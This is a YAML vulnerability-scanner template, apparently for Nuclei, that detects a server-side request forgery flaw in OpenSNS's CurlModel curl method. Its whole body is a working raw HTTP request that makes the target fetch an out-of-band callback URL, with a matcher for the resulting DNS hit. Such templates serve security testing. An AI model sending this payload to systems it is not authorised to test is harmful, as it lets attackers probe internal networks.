id: OpenSNS-CurlModel-SSRF

info:
  name: OpenSNS-CurlModel-SSRF
  author: apple
  severity: high
  description: OpenSNS CurlModel.class.php文件中curl方法存在SSRF漏洞，通过漏洞攻击者可以探测内网信息
  reference:
    - https://github.com/Threekiii/Awesome-POC/blob/master/CMS%E6%BC%8F%E6%B4%9E/OpenSNS%20CurlModel.class.php%20SSRF%E6%BC%8F%E6%B4%9E.md
  tags: tags

http:
  - raw:
      - |-
        GET /?s=weibo/share/shareBox&query=app=Admin%26model=Curl%26method=curl%26id=http://{{interactsh-url}} HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 80
        Accept-Language: zh-CN,zh;q=0.8
        Accept: */*
        User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0
        Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
        Connection: keep-alive
        Cache-Control: max-age=0
    matchers:
      - type: word
        part: interactsh_protocol # Confirms the DNS Interaction
        words:
          - "dns"